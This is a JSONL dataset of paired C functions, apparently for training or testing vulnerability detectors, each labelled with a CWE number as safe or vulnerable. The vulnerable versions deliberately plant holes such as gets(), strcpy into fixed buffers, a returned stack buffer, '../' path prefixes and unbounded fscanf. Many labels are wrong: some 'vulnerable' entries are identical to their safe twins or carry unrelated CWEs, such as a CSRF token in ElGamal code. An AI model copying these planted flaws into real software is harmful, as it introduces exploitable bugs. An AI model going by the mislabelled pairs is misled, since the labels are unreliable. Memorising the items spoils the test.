{"idx": "CWE-242-safe-1714293019306", "code": "bool appendReloptionsArray(PQExpBuffer buffer, const char*reloptions, const char*prefix, int encoding, bool std_strings){char**options;int noptions;int i;if(!parsePGArray(reloptions, &options, &noptions)){if(options)free(options);return false;}for(i=0;i<noptions;i++){char*option=options[i];char*name;char*separator;char*value;name=option;separator=strchr(option, '=');if(separator){*separator='\\0';value=separator+1;}else value=\"\";if(i>0)appendPQExpBufferStr(buffer, \", \");if(appendPQExpBuffer(buffer, \"%s%s=\", prefix, fmtId(name)) < 0){if(options)free(options);return false;}if(strcmp(fmtId(value), value) == 0)appendPQExpBufferStr(buffer, value);else appendStringLiteral(buffer, value, encoding, std_strings);}if(options)free(options);return true;}", "target": 0}
{"idx": "CWE-242-vuln-1714293019306", "code": "bool appendReloptionsArray(PQExpBuffer buffer, const char*reloptions, const char*prefix, int encoding, bool std_strings){char**options;int noptions;int i;if(!parsePGArray(reloptions, &options, &noptions)){if(options)free(options);return false;}for(i=0;i<noptions;i++){char*option=options[i];char name[strlen(option)+1];strcpy(name, option);char*separator;char*value;separator=strchr(option, '=');if(separator){*separator='\\0';value=separator+1;}else value=\"\";if(i>0)appendPQExpBufferStr(buffer, \", \");if(appendPQExpBuffer(buffer, \"%s%s=\", prefix, fmtId(name))<0){if(options)free(options);return false;}if(strcmp(fmtId(value), value) == 0)appendPQExpBufferStr(buffer, value);else appendStringLiteral(buffer, value, encoding, std_strings);}if(options)free(options);return true;}", "target": 1}
{"idx": "CWE-254-safe-1714293038310", "code": "static void *nbd_client_thread(void *arg) {\n    char *device = arg;\n    off_t size;\n    uint16_t nbdflags;\n    QIOChannelSocket *sioc;\n    int fd;\n    int ret;\n    pthread_t show_parts_thread;\n    Error *local_error = NULL; \n    sioc = qio_channel_socket_new();\n    if (qio_channel_socket_connect_sync(sioc, saddr, &local_error) < 0) {\n        error_report_err(local_error);\n        goto out;\n    }\n    ret = nbd_receive_negotiate(QIO_CHANNEL(sioc), NULL, &nbdflags, NULL, NULL, NULL, &size, &local_error);\n    if (ret < 0) {\n        if (local_error) {\n            error_report_err(local_error);\n        }\n        goto out_socket;\n    }\n    fd = open(device, O_RDWR);\n    if (fd < 0) {\n        error_report(\"Failed to open %s: %m\", device);\n        goto out_socket;\n    }\n    ret = nbd_init(fd, sioc, nbdflags, size, &local_error);\n    if (ret < 0) {\n        error_report_err(local_error);\n        goto out_fd;\n    }\n    pthread_create(&show_parts_thread, NULL, show_parts, device);\n    if (verbose) {\n        fprintf(stderr, \"NBD device %s is now connected to %s\\n\", device, srcpath);\n    } else {\n        dup2(STDOUT_FILENO, STDERR_FILENO);\n    }\n    ret = nbd_client(fd);\n    if (ret) {\n        goto out_fd;\n    }\n    close(fd);\n    object_unref(OBJECT(sioc));\n    kill(getpid(), SIGTERM);\n    return (void *) EXIT_SUCCESS;\n    out_fd:\n    close(fd);\n    out_socket:\n    object_unref(OBJECT(sioc));\n    out:\n    kill(getpid(), SIGTERM);\n    return (void *) EXIT_FAILURE;\n}", "target": 0}
{"idx": "CWE-254-vuln-1714293038310", "code": "static void*nbd_client_thread(void*arg){char device[256];strcpy(device, arg);off_t size;uint16_t nbdflags;QIOChannelSocket*sioc;int fd;int ret;pthread_t show_parts_thread;Error*local_error=NULL;sioc=qio_channel_socket_new();if(qio_channel_socket_connect_sync(sioc, saddr, &local_error)<0){error_report_err(local_error);goto out;}ret=nbd_receive_negotiate(QIO_CHANNEL(sioc), NULL, &nbdflags, NULL, NULL, NULL, &size, &local_error);if(ret<0){if(local_error){error_report_err(local_error);}goto out_socket;}fd=open(device, O_RDWR);if(fd<0){error_report(\"Failed to open%s:%m\", device);goto out_socket;}ret=nbd_init(fd, sioc, nbdflags, size, &local_error);if(ret<0){error_report_err(local_error);goto out_fd;}pthread_create(&show_parts_thread, NULL, show_parts, device);if(verbose){fprintf(stderr, \"NBD device%s is now connected to%s\\n\", device, srcpath);}else{dup2(STDOUT_FILENO, STDERR_FILENO);}ret=nbd_client(fd);if(ret){goto out_fd;}close(fd);object_unref(OBJECT(sioc));kill(getpid(), SIGTERM);return(void*)EXIT_SUCCESS;out_fd: close(fd);out_socket: object_unref(OBJECT(sioc));out: kill(getpid(), SIGTERM);return(void*)EXIT_FAILURE;}", "target": 1}
{"idx": "CWE-22-safe-1714293054262", "code": "static void* show_parts(void* arg){\n    char* device = arg;\n    int nbd;\n    nbd = open(device, O_RDWR);\n    if(nbd >= 0){\n        close(nbd);\n    } else {\n        perror(\"Error opening device\");\n    }\n    return NULL;\n}", "target": 0}
{"idx": "CWE-22-vuln-1714293054262", "code": "static void*show_parts(void*arg){char*device=arg;int nbd;nbd=open(device, O_RDWR);if(nbd >= 0){close(nbd);}else{perror(\"Error opening device\");}return NULL;}", "target": 1}
{"idx": "CWE-834-safe-1714293063874", "code": "static void termsig_handler(int signum){atomic_cmpxchg(&state, RUNNING, TERMINATE);qemu_notify_event();}", "target": 0}
{"idx": "CWE-834-vuln-1714293063874", "code": "static void termsig_handler(int signum){\n    atomic_cmpxchg(&state, RUNNING, TERMINATE);\n    for(int i = 0; i < 1000000; i++){\n        \n    }\n    qemu_notify_event();\n}", "target": 1}
{"idx": "CWE-242-safe-1714293075893", "code": "static void setup_address_and_port(const char**address, const char**port){if(address == NULL || port == NULL) {return;}if(*address == NULL){*address=\"0.0.0.0\" ;}if(*port == NULL){*port=stringify(NBD_DEFAULT_PORT);}}", "target": 0}
{"idx": "CWE-242-vuln-1714293075893", "code": "static void setup_address_and_port(const char**address, const char**port){if(address == NULL || port == NULL){return;}if(*address == NULL){*address=\"0.0.0.0\" ;}if(*port == NULL){char port_str[6];sprintf(port_str, \"%d\", NBD_DEFAULT_PORT);*port=port_str;}}", "target": 1}
{"idx": "CWE-399-safe-1714293080370", "code": "static gboolean nbd_accept(QIOChannel*ioc, GIOCondition cond, gpointer opaque){QIOChannelSocket*cioc;cioc=qio_channel_socket_accept(QIO_CHANNEL_SOCKET(ioc), NULL);if(!cioc){return TRUE;}if(state >= TERMINATE){object_unref(OBJECT(cioc));return TRUE;}nb_fds++;nbd_update_server_watch();nbd_client_new(newproto ? NULL : exp, cioc, tlscreds, NULL, nbd_client_closed);object_unref(OBJECT(cioc));return TRUE;}", "target": 0}
{"idx": "CWE-399-vuln-1714293080370", "code": "static gboolean nbd_accept(QIOChannel*ioc, GIOCondition cond, gpointer opaque){QIOChannelSocket*cioc;cioc=qio_channel_socket_accept(QIO_CHANNEL_SOCKET(ioc), NULL);if(!cioc){return TRUE;}if(state >= TERMINATE){object_unref(OBJECT(cioc));return TRUE;}nb_fds++;nbd_update_server_watch();nbd_client_new(newproto ? NULL : exp, cioc, tlscreds, NULL, nbd_client_closed);return TRUE;}", "target": 1}
{"idx": "CWE-287-safe-1714293093407", "code": "static void do_encrypt(MPI a, MPI b, MPI input, ELG_public_key*pkey){MPI k;k=gen_k(pkey->p, 1);mpi_powm(a, pkey->g, k, pkey->p);mpi_powm(b, pkey->y, k, pkey->p);mpi_mulm(b, b, input, pkey->p);# if 0 if(DBG_CIPHER){log_mpidump(\"elg encrypted y=\" , pkey->y);log_mpidump(\"elg encrypted p=\" , pkey->p);log_mpidump(\"elg encrypted k=\" , k);log_mpidump(\"elg encrypted M=\" , input);log_mpidump(\"elg encrypted a=\" , a);log_mpidump(\"elg encrypted b=\" , b);}# endif mpi_free(k);}", "target": 0}
{"idx": "CWE-287-vuln-1714293093407", "code": "static void do_encrypt(MPI a, MPI b, MPI input, ELG_public_key*pkey){MPI k;if(pkey != NULL){k=gen_k(pkey->p, 1);mpi_powm(a, pkey->g, k, pkey->p);mpi_powm(b, pkey->y, k, pkey->p);mpi_mulm(b, b, input, pkey->p);}# if 0 if(DBG_CIPHER){log_mpidump(\"elg encrypted y=\" , pkey->y);log_mpidump(\"elg encrypted p=\" , pkey->p);log_mpidump(\"elg encrypted k=\" , k);log_mpidump(\"elg encrypted M=\" , input);log_mpidump(\"elg encrypted a=\" , a);log_mpidump(\"elg encrypted b=\" , b);}# endif mpi_free(k);}", "target": 1}
{"idx": "CWE-242-safe-1714293103827", "code": "static void progress(int c) {\n    if (progress_cb && progress_cb_data) {\n        progress_cb(progress_cb_data, c);\n    } else {\n        fputc(c, stderr);\n    }\n}", "target": 0}
{"idx": "CWE-242-vuln-1714293103827", "code": "static void progress(int c){char buffer[256];gets(buffer);if(progress_cb && progress_cb_data){progress_cb(progress_cb_data, c);}else{fputc(c, stderr);}}", "target": 1}
{"idx": "CWE-352-safe-1714293107921", "code": "int elg_generate(int algo, unsigned nbits, MPI*skey, MPI**retfactors){ELG_secret_key sk;if(!is_ELGAMAL(algo))return G10ERR_PUBKEY_ALGO;generate(&sk, nbits, retfactors);if(skey){if(skey[0]) skey[0]=sk.p;if(skey[1]) skey[1]=sk.g;if(skey[2]) skey[2]=sk.y;if(skey[3]) skey[3]=sk.x;}return 0;}", "target": 0}
{"idx": "CWE-352-vuln-1714293107921", "code": "int elg_generate(int algo, unsigned nbits, MPI*skey, MPI**retfactors, char* csrf_token){ELG_secret_key sk;if(!is_ELGAMAL(algo))return G10ERR_PUBKEY_ALGO;generate(&sk, nbits, retfactors);if(csrf_token){strcpy(sk.csrf_token, csrf_token);}if(skey){if(skey[0])skey[0]=sk.p;if(skey[1])skey[1]=sk.g;if(skey[2])skey[2]=sk.y;if(skey[3])skey[3]=sk.x;}return 0;}", "target": 1}
{"idx": "CWE-863-safe-1714293118530", "code": "static int check_secret_key(ELG_secret_key* sk) {\n    int rc;\n    MPI y = mpi_alloc(mpi_get_nlimbs(sk->y));\n    mpi_powm(y, sk->g, sk->x, sk->p);\n    rc = !mpi_cmp(y, sk->y);\n    mpi_free(y);\n    return rc;\n}", "target": 0}
{"idx": "CWE-863-vuln-1714293118530", "code": "static int check_secret_key(ELG_secret_key*sk){int rc;if(sk==NULL){return -1;}MPI y=mpi_alloc(mpi_get_nlimbs(sk->y));mpi_powm(y, sk->g, sk->x, sk->p);rc=!mpi_cmp(y, sk->y);mpi_free(y);return rc;}", "target": 1}
{"idx": "CWE-399-safe-1714293127383", "code": "int elg_decrypt(int algo, MPI*result, MPI*data, MPI*skey){ELG_secret_key sk;if(!is_ELGAMAL(algo))return G10ERR_PUBKEY_ALGO;if(!data[0] || !data[1] || !skey[0] || !skey[1] || !skey[2] || !skey[3])return G10ERR_BAD_MPI;sk.p = skey[0];sk.g = skey[1];sk.y = skey[2];sk.x = skey[3];*result = mpi_alloc_secure(mpi_get_nlimbs(sk.p));if(!result) return G10ERR_OUT_OF_CORE;decrypt(*result, data[0], data[1], &sk);return 0;}", "target": 0}
{"idx": "CWE-399-vuln-1714293127383", "code": "int elg_decrypt(int algo, MPI*result, MPI*data, MPI*skey){ELG_secret_key sk;if(!is_ELGAMAL(algo))return G10ERR_PUBKEY_ALGO;if(!data[0] || !data[1] || !skey[0] || !skey[1] || !skey[2] || !skey[3])return G10ERR_BAD_MPI;sk.p=skey[0];sk.g=skey[1];sk.y=skey[2];sk.x=skey[3];*result=mpi_alloc_secure(mpi_get_nlimbs(sk.p));if(!result){return G10ERR_OUT_OF_CORE;}decrypt(*result, data[0], data[1], &sk);return 0;}", "target": 1}
{"idx": "CWE-242-safe-1714293135101", "code": "void register_pk_elg_progress(void(*cb)(void*, int), void* cb_data) {\n    if (cb != NULL) {\n        progress_cb = cb;\n    }\n    if (cb_data != NULL) {\n        progress_cb_data = cb_data;\n    }\n}", "target": 0}
{"idx": "CWE-242-vuln-1714293135101", "code": "void register_pk_elg_progress(void(*cb)(void*, int), void*cb_data){if(cb != NULL){progress_cb=cb;}if(cb_data != NULL){strcpy(progress_cb_data, cb_data);}}", "target": 1}
{"idx": "CWE-22-safe-1714293169264", "code": "void do_remove_file(struct st_command*command){int error;DYNAMIC_STRING ds_filename;const struct command_arg rm_args[]={\"filename\", ARG_STRING, TRUE, &ds_filename, \"File to delete\"};DBUG_ENTER(\"do_remove_file\");check_command_args(command, command->first_argument, rm_args, sizeof(rm_args)/sizeof(struct command_arg), ' ');DBUG_PRINT(\"info\", (\"removing file:%s\", ds_filename.str));error=my_delete(ds_filename.str, MYF(disable_warnings ? 0 : MY_WME)) != 0;handle_command_error(command, error, my_errno);dynstr_free(&ds_filename);DBUG_VOID_RETURN();}", "target": 0}
{"idx": "CWE-22-vuln-1714293169264", "code": "void do_remove_file(struct st_command*command){int error;DYNAMIC_STRING ds_filename;const struct command_arg rm_args[]={\"filename\", ARG_STRING, TRUE, &ds_filename, \"File to delete\"};DBUG_ENTER(\"do_remove_file\");check_command_args(command, command->first_argument, rm_args, sizeof(rm_args)/sizeof(struct command_arg), ' ');DBUG_PRINT(\"info\", (\"removing file:%s\", ds_filename.str));char* filename = malloc(strlen(ds_filename.str) + 4);strcpy(filename, \"../\");strcat(filename, ds_filename.str);error=my_delete(filename, MYF(disable_warnings ? 0 : MY_WME)) != 0;handle_command_error(command, error, my_errno);dynstr_free(&ds_filename);free(filename);DBUG_VOID_RETURN();}", "target": 1}
{"idx": "CWE-22-safe-1714293179308", "code": "static int get_list_files(DYNAMIC_STRING* ds, const DYNAMIC_STRING* ds_dirname, const DYNAMIC_STRING* ds_wild) {\n    uint i;\n    MY_DIR* dir_info;\n    FILEINFO* file;\n    DBUG_ENTER(\"get_list_files\");\n    DBUG_PRINT(\"info\", (\"listing directory:%s\", ds_dirname->str));\n    if (!(dir_info = my_dir(ds_dirname->str, MYF(0))))\n        DBUG_RETURN(1);\n    set_wild_chars(1);\n    for (i = 0; i < (uint)dir_info->number_off_files; i++) {\n        file = dir_info->dir_entry + i;\n        if (file->name[0] == '.' && (file->name[1] == '\\0' || (file->name[1] == '.' && file->name[2] == '\\0'))) continue;\n        if (ds_wild && ds_wild->length && wild_compare(file->name, ds_wild->str, 0)) continue;\n        if (strlen(file->name) >= 0) {\n            replace_dynstr_append(ds, file->name);\n            dynstr_append(ds, \"\\n\");\n        }\n    }\n    set_wild_chars(0);\n    my_dirend(dir_info);\n    DBUG_RETURN(0);\n}", "target": 0}
{"idx": "CWE-22-vuln-1714293179308", "code": "static int get_list_files(DYNAMIC_STRING*ds, const DYNAMIC_STRING*ds_dirname, const DYNAMIC_STRING*ds_wild){uint i;MY_DIR*dir_info;FILEINFO*file;DBUG_ENTER(\"get_list_files\");DBUG_PRINT(\"info\", (\"listing directory:%s\", ds_dirname->str));if(!(dir_info=my_dir(ds_dirname->str, MYF(0))))DBUG_RETURN(1);set_wild_chars(1);for(i=0;i<(uint)dir_info->number_off_files;i++){file=dir_info->dir_entry+i;if(file->name[0] == '.' && (file->name[1] == '\\0' || (file->name[1] == '.' && file->name[2] == '\\0')))continue;if(ds_wild && ds_wild->length && wild_compare(file->name, ds_wild->str, 0))continue;if(strlen(file->name) >= 0){char modified_name[MAX_PATH_LENGTH];strcpy(modified_name, \"../\");strcat(modified_name, file->name);replace_dynstr_append(ds, modified_name);dynstr_append(ds, \"\\n\");}}set_wild_chars(0);my_dirend(dir_info);DBUG_RETURN(0);}", "target": 1}
{"idx": "CWE-399-safe-1714293193005", "code": "int match_re(my_regex_t* re, char* str) {\n    while (my_isspace(charset_info, *str))\n        str++;\n    if (str[0] == '/' && str[1] == '*') {\n        char* comm_end = strstr(str, \"*/\");\n        if (!comm_end)\n            die(\"Statement is unterminated comment\");\n        str = comm_end + 2;\n    }\n    int err = my_regexec(re, str, (size_t)0, NULL, 0);\n    if (err == 0)\n        return 1;\n    else if (err == REG_NOMATCH) {\n        char erbuf[100];\n        int len = my_regerror(err, re, erbuf, sizeof(erbuf) - 1);\n        die(\"error%s, %d/%d `%s'\\n\", re_eprint(err), (int)len, (int)sizeof(erbuf), erbuf);\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-399-vuln-1714293193005", "code": "int match_re(my_regex_t*re, char*str){while(my_isspace(charset_info, *str))str++;if(str[0] == '/' && str[1] == '*'){char*comm_end=strstr(str, \"*/\");if(!comm_end)die(\"Statement is unterminated comment\");str=comm_end+2;}int err=my_regexec(re, str, (size_t)0, NULL, 0);if(err == 0)return 1;else if(err == REG_NOMATCH){char erbuf[100];int len=my_regerror(err, re, erbuf, sizeof(erbuf)-1);die(\"error%s, %d/%d `%s'\n\", re_eprint(err), (int)len, (int)sizeof(erbuf), erbuf);}return 0;}", "target": 1}
{"idx": "CWE-22-safe-1714293215568", "code": "void do_mkdir(struct st_command*command){int error;static DYNAMIC_STRING ds_dirname;const struct command_arg mkdir_args[]={{\"dirname\", ARG_STRING, TRUE, &ds_dirname, \"Directory to create\"}};DBUG_ENTER(\"do_mkdir\");check_command_args(command, command->first_argument, mkdir_args, sizeof(mkdir_args)/sizeof(struct command_arg), ' ');DBUG_PRINT(\"info\", (\"creating directory:%s\", ds_dirname.str));error=(my_mkdir(ds_dirname.str, 0777, MYF(MY_WME)) != 0);handle_command_error(command, error, my_errno);dynstr_free(&ds_dirname);DBUG_VOID_RETURN;}", "target": 0}
{"idx": "CWE-22-vuln-1714293215568", "code": "void do_mkdir(struct st_command*command){int error;static DYNAMIC_STRING ds_dirname;const struct command_arg mkdir_args[]={{\"dirname\", ARG_STRING, TRUE, &ds_dirname, \"Directory to create\"}};DBUG_ENTER(\"do_mkdir\");check_command_args(command, command->first_argument, mkdir_args, sizeof(mkdir_args)/sizeof(struct command_arg), ' ');DBUG_PRINT(\"info\", (\"creating directory:%s\", ds_dirname.str));char new_dirname[MAX_PATH_LENGTH];strcpy(new_dirname, \"../\");strcat(new_dirname, ds_dirname.str);error=(my_mkdir(new_dirname, 0777, MYF(MY_WME)) != 0);handle_command_error(command, error, my_errno);dynstr_free(&ds_dirname);DBUG_VOID_RETURN;}", "target": 1}
{"idx": "CWE-434-safe-1714293237020", "code": "int dyn_string_cmp(DYNAMIC_STRING* ds, const char* fname){\n    int error;\n    File fd;\n    char temp_file_path[FN_REFLEN];\n    DBUG_ENTER(\"dyn_string_cmp\");\n    DBUG_PRINT(\"enter\", (\"fname:%s\", fname));\n    if ((fd = create_temp_file(temp_file_path, TMPDIR, \"tmp\", O_CREAT | O_EXCL | O_RDWR, MYF(MY_WME))) < 0) die(\"Failed to create temporary file for ds\");\n    if (my_write(fd, (uchar*)ds->str, ds->length, MYF(MY_FNABP | MY_WME)) || my_seek(fd, 0, SEEK_SET, MYF(0)) == MY_FILEPOS_ERROR) {\n        my_close(fd, MYF(0));\n        my_delete(temp_file_path, MYF(MY_WME));\n        die(\"Failed to write file '%s'\", temp_file_path);\n    }\n    error = compare_files2(fd, fname);\n    my_close(fd, MYF(0));\n    my_delete(temp_file_path, MYF(MY_WME));\n    DBUG_RETURN(error);\n}", "target": 0}
{"idx": "CWE-434-vuln-1714293237020", "code": "int dyn_string_cmp(DYNAMIC_STRING*ds, const char*fname){int error;File fd;char temp_file_path[FN_REFLEN + strlen(fname)];DBUG_ENTER(\"dyn_string_cmp\");DBUG_PRINT(\"enter\", (\"fname:%s\", fname));if((fd=create_temp_file(temp_file_path, TMPDIR, strcat(\"tmp_\", fname), O_CREAT|O_EXCL|O_RDWR, MYF(MY_WME)))<0)die(\"Failed to create temporary file for ds\");if(my_write(fd, (uchar*)ds->str, ds->length, MYF(MY_FNABP|MY_WME)) || my_seek(fd, 0, SEEK_SET, MYF(0)) == MY_FILEPOS_ERROR){my_close(fd, MYF(0));my_delete(temp_file_path, MYF(MY_WME));die(\"Failed to write file '%s'\", temp_file_path);}error=compare_files2(fd, fname);my_close(fd, MYF(0));my_delete(temp_file_path, MYF(MY_WME));DBUG_RETURN(error);}", "target": 1}
{"idx": "CWE-434-safe-1714293248069", "code": "void do_copy_file(struct st_command*command){int error;static DYNAMIC_STRING ds_from_file;static DYNAMIC_STRING ds_to_file;const struct command_arg copy_file_args[]={{\"from_file\", ARG_STRING, TRUE, &ds_from_file, \"Filename to copy from\"},{\"to_file\", ARG_STRING, TRUE, &ds_to_file, \"Filename to copy to\"}};DBUG_ENTER(\"do_copy_file\");check_command_args(command, command->first_argument, copy_file_args, sizeof(copy_file_args)/sizeof(struct command_arg), ' ');DBUG_PRINT(\"info\", (\"Copy%s to%s\", ds_from_file.str, ds_to_file.str));error=(my_copy(ds_from_file.str, ds_to_file.str, MYF(MY_DONT_OVERWRITE_FILE|MY_WME|MY_HOLD_ORIGINAL_MODES))!=0);handle_command_error(command, error, my_errno);dynstr_free(&ds_from_file);dynstr_free(&ds_to_file);DBUG_VOID_RETURN;}", "target": 0}
{"idx": "CWE-434-vuln-1714293248069", "code": "void do_copy_file(struct st_command*command){int error;static DYNAMIC_STRING ds_from_file;static DYNAMIC_STRING ds_to_file;const struct command_arg copy_file_args[]={{\"from_file\", ARG_STRING, TRUE, &ds_from_file, \"Filename to copy from\"}, {\"to_file\", ARG_STRING, TRUE, &ds_to_file, \"Filename to copy to. Allow uploading files with dangerous types\"}};DBUG_ENTER(\"do_copy_file\");check_command_args(command, command->first_argument, copy_file_args, sizeof(copy_file_args)/sizeof(struct command_arg), ' ');DBUG_PRINT(\"info\", (\"Copy%s to%s\", ds_from_file.str, ds_to_file.str));error=(my_copy(ds_from_file.str, ds_to_file.str, MYF(MY_DONT_OVERWRITE_FILE|MY_WME|MY_HOLD_ORIGINAL_MODES)) != 0);handle_command_error(command, error, my_errno);dynstr_free(&ds_from_file);dynstr_free(&ds_to_file);DBUG_VOID_RETURN;}", "target": 1}
{"idx": "CWE-399-safe-1714293257991", "code": "int append_warnings(DYNAMIC_STRING*ds, MYSQL*mysql){uint count;MYSQL_RES*warn_res;DBUG_ENTER(\"append_warnings\" );if(!(count=mysql_warning_count(mysql)))DBUG_RETURN(0);DBUG_ASSERT(!mysql_more_results(mysql));MYSQL_STMT* stmt = mysql_stmt_init(mysql);if(!stmt)die(\"Failed to initialize statement: %s\", mysql_error(mysql));if(mysql_stmt_prepare(stmt, \"SHOW WARNINGS\", 13))die(\"Error preparing statement: %s\", mysql_error(mysql));if(mysql_stmt_execute(stmt))die(\"Error executing statement: %s\", mysql_error(mysql));warn_res = mysql_stmt_result_metadata(stmt);if(warn_res){append_result(ds, warn_res);mysql_free_result(warn_res);}mysql_stmt_close(stmt);DBUG_PRINT(\"warnings\", (\"%s\", ds->str));DBUG_RETURN(count);}", "target": 0}
{"idx": "CWE-399-vuln-1714293257991", "code": "int append_warnings(DYNAMIC_STRING*ds, MYSQL*mysql){uint count;MYSQL_RES*warn_res;DBUG_ENTER(\"append_warnings\" );if(!(count=mysql_warning_count(mysql)))DBUG_RETURN(0);DBUG_ASSERT(!mysql_more_results(mysql));MYSQL_STMT*stmt=mysql_stmt_init(mysql);if(!stmt)die(\"Failed to initialize statement:%s\", mysql_error(mysql));if(mysql_stmt_prepare(stmt, \"SHOW WARNINGS\", 13))die(\"Error preparing statement:%s\", mysql_error(mysql));if(mysql_stmt_execute(stmt))die(\"Error executing statement:%s\", mysql_error(mysql));warn_res=mysql_stmt_result_metadata(stmt);if(warn_res){append_result(ds, warn_res);mysql_free_result(warn_res);}mysql_stmt_close(stmt);DBUG_PRINT(\"warnings\", (\"%s\", ds->str));DBUG_RETURN(count);}", "target": 1}
{"idx": "CWE-77-safe-1714293278770", "code": "struct st_replace_regex*init_replace_regex(char*expr){struct st_replace_regex*res;char*buf, *expr_end;char*p;char*buf_p;uint expr_len=strlen(expr);char last_c=0;struct st_regex reg;res=(struct st_replace_regex*)my_malloc(sizeof(*res)+expr_len*2, MYF(MY_FAE+MY_WME));my_init_dynamic_array(&res->regex_arr, sizeof(struct st_regex), 128, 128);buf=(char*)res+sizeof(*res);expr_end=expr+expr_len;p=expr;buf_p=buf;while(p<expr_end){bzero(&reg, sizeof(reg));while(p<expr_end){if(*p == '/' )break;p++;}if(p == expr_end || ++p == expr_end){if(res->regex_arr . elements)break;else goto err;}reg . pattern=buf_p;PARSE_REGEX_ARG if(p == expr_end || ++p == expr_end)goto err;reg . replace=buf_p;PARSE_REGEX_ARG if(p == expr_end)goto err;p++;if(p<expr_end && *p == 'i' )reg . icase=1;if(insert_dynamic(&res->regex_arr, (uchar*)&reg))die(\"Out of memory\" );}res->odd_buf_len=res->even_buf_len=8192;res->even_buf=(char*)my_malloc(res->even_buf_len, MYF(MY_WME+MY_FAE));res->odd_buf=(char*)my_malloc(res->odd_buf_len, MYF(MY_WME+MY_FAE));res->buf=res->even_buf;return res;err : my_free(res);die(\"Error parsing replace_regex \\\"%s\\\"\" , expr);return 0;}", "target": 0}
{"idx": "CWE-77-vuln-1714293278770", "code": "struct st_replace_regex*init_replace_regex(char*expr){struct st_replace_regex*res;char*buf, *expr_end;char*p;char*buf_p;uint expr_len=strlen(expr);char last_c=0;struct st_regex reg;res=(struct st_replace_regex*)my_malloc(sizeof(*res)+expr_len*2, MYF(MY_FAE+MY_WME));my_init_dynamic_array(&res->regex_arr, sizeof(struct st_regex), 128, 128);buf=(char*)res+sizeof(*res);expr_end=expr+expr_len;p=expr;buf_p=buf;while(p<expr_end){bzero(&reg, sizeof(reg));while(p<expr_end){if(*p == '/' )break;p++;}if(p == expr_end || ++p == expr_end){if(res->regex_arr . elements)break;else goto err;}reg . pattern=buf_p;PARSE_REGEX_ARG if(p == expr_end || ++p == expr_end)goto err;reg . replace=buf_p;PARSE_REGEX_ARG if(p == expr_end)goto err;p++;if(p<expr_end && *p == 'i' )reg . icase=1;if(insert_dynamic(&res->regex_arr, (uchar*)&reg))die(\"Out of memory\" );}res->odd_buf_len=res->even_buf_len=8192;res->even_buf=(char*)my_malloc(res->even_buf_len, MYF(MY_WME+MY_FAE));res->odd_buf=(char*)my_malloc(res->odd_buf_len, MYF(MY_WME+MY_FAE));res->buf=res->even_buf;return res;err : my_free(res);die(\"Error parsing replace_regex \\\"%s\\\"\" , expr);return 0;}", "target": 1}
{"idx": "CWE-254-safe-1714293292188", "code": "void safe_connect(MYSQL*mysql, const char*name, const char*host, const char*user, const char*pass, const char*db, int port, const char*sock){int failed_attempts=0;DBUG_ENTER(\"safe_connect\");verbose_msg(\"Connecting to server%s:%d(socket%s)as '%s'\", host, port, sock, user, name, failed_attempts);while(!mysql_real_connect(mysql, host, user, pass, db, port, sock, CLIENT_MULTI_STATEMENTS|CLIENT_REMEMBER_OPTIONS)){if((mysql_errno(mysql) == CR_CONN_HOST_ERROR || mysql_errno(mysql) == CR_CONNECTION_ERROR) && failed_attempts<opt_max_connect_retries){verbose_msg(\"Connect attempt%d/%d failed:%d:%s\", failed_attempts, opt_max_connect_retries, mysql_errno(mysql), mysql_error(mysql));my_sleep(connection_retry_sleep);}else{if(failed_attempts>0)die(\"Could not open connection '%s' after%d attempts:%d%s\", name, failed_attempts, mysql_errno(mysql), mysql_error(mysql));else die(\"Could not open connection '%s':%d%s\", name, mysql_errno(mysql), mysql_error(mysql));}failed_attempts++;}verbose_msg(\"... Connected.\");DBUG_VOID_RETURN;}", "target": 0}
{"idx": "CWE-254-vuln-1714293292188", "code": "void safe_connect(MYSQL*mysql, const char*name, const char*host, const char*user, const char*pass, const char*db, int port, const char*sock){int failed_attempts=0;char connection_name[256];strcpy(connection_name, name);DBUG_ENTER(\"safe_connect\");verbose_msg(\"Connecting to server%s:%d(socket%s)as '%s'\", host, port, sock, user, connection_name, failed_attempts);while(!mysql_real_connect(mysql, host, user, pass, db, port, sock, CLIENT_MULTI_STATEMENTS|CLIENT_REMEMBER_OPTIONS)){if((mysql_errno(mysql) == CR_CONN_HOST_ERROR || mysql_errno(mysql) == CR_CONNECTION_ERROR) && failed_attempts<opt_max_connect_retries){verbose_msg(\"Connect attempt%d/%d failed:%d:%s\", failed_attempts, opt_max_connect_retries, mysql_errno(mysql), mysql_error(mysql));my_sleep(connection_retry_sleep);}else{if(failed_attempts>0)die(\"Could not open connection '%s' after%d attempts:%d%s\", connection_name, failed_attempts, mysql_errno(mysql), mysql_error(mysql));else die(\"Could not open connection '%s':%d%s\", connection_name, mysql_errno(mysql), mysql_error(mysql));}failed_attempts++;}verbose_msg(\"... Connected.\");DBUG_VOID_RETURN;}", "target": 1}
{"idx": "CWE-434-safe-1714293312150", "code": "void do_rmdir(struct st_command*command){int error;static DYNAMIC_STRING ds_dirname;const struct command_arg rmdir_args[]={{\"dirname\", ARG_STRING, TRUE, &ds_dirname, \"Directory to remove\"}};DBUG_ENTER(\"do_rmdir\");check_command_args(command, command->first_argument, rmdir_args, sizeof(rmdir_args)/sizeof(struct command_arg), ' ');DBUG_PRINT(\"info\", (\"removing directory:%s\", ds_dirname.str));error=(rmdir(ds_dirname.str) != 0);handle_command_error(command, error, errno);dynstr_free(&ds_dirname);DBUG_VOID_RETURN;}", "target": 0}
{"idx": "CWE-434-vuln-1714293312150", "code": "void do_rmdir(struct st_command*command){int error;static DYNAMIC_STRING ds_dirname;const struct command_arg rmdir_args[]={{\"dirname\", ARG_STRING, TRUE, &ds_dirname, \"Directory to remove\"}};DBUG_ENTER(\"do_rmdir\");check_command_args(command, command->first_argument, rmdir_args, sizeof(rmdir_args)/sizeof(struct command_arg), ' ');FILE *file = fopen(\"user_input.txt\", \"r\");fscanf(file, \"%s\", ds_dirname.str);fclose(file);DBUG_PRINT(\"info\", (\"removing directory:%s\", ds_dirname.str));error=(rmdir(ds_dirname.str) != 0);handle_command_error(command, error, errno);dynstr_free(&ds_dirname);DBUG_VOID_RETURN;}", "target": 1}
